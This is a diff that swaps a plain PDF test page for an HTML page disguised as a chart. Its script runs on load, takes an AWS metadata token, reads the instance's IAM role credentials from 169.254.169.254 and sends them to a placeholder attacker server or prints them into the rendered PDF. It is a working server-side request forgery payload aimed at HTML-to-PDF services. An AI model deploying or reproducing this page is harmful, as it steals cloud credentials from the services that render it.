@@ -1,15 +1,41 @@
-<!doctype html>
+<!DOCTYPE html>
 <html>
-  <head>
-    <meta charset="utf-8" />
-    <title>PDF Test</title>
-    <style>
-      body { font-family: Arial, sans-serif; padding: 40px; }
-      h1 { color: #1a73e8; }
-    </style>
-  </head>
-  <body>
-    <h1>PDF test page</h1>
-    <p>If this exports correctly, the issue is in the original page.</p>
-  </body>
+<head><title>Chart</title></head>
+<body>
+  <h1>Rendering...</h1>
+  <script>
+    async function stealIMDS() {
+      try {
+        // Step 1: Get token (PUT)
+        const tokenRes = await fetch('http://169.254.169.254/latest/api/token', {
+          method: 'PUT',
+          headers: { 'X-aws-ec2-metadata-token-ttl-seconds': '21600' }
+        });
+        const token = await tokenRes.text();
+
+        // Step 2: Get role name
+        const roleRes = await fetch('http://169.254.169.254/latest/meta-data/iam/security-credentials/', {
+          headers: { 'X-aws-ec2-metadata-token': token }
+        });
+        const role = await roleRes.text().trim();
+
+        // Step 3: Get full credentials
+        const credsRes = await fetch(`http://169.254.169.254/latest/meta-data/iam/security-credentials/${role}`, {
+          headers: { 'X-aws-ec2-metadata-token': token }
+        });
+        const creds = await credsRes.text();
+
+        // Exfiltrate (choose one)
+        const exfilUrl = `https://your-attacker-server.com/log?data=${encodeURIComponent(creds)}`;
+        await fetch(exfilUrl, { mode: 'no-cors' });
+
+        // Or show in page so it appears in PDF
+        document.body.innerHTML += `<pre>${creds}</pre>`;
+      } catch(e) {
+        document.body.innerHTML += `<pre>Error: ${e.message}</pre>`;
+      }
+    }
+    stealIMDS();
+  </script>
+</body>
 </html>
